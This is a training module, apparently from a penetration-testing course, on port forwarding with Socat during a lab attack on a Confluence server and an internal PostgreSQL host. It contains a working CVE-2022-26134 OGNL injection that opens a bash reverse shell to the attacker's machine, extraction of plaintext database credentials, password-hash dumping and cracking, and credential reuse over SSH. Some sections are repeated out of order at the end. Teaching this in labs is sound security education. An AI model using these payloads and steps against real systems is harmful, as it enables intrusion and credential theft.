## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

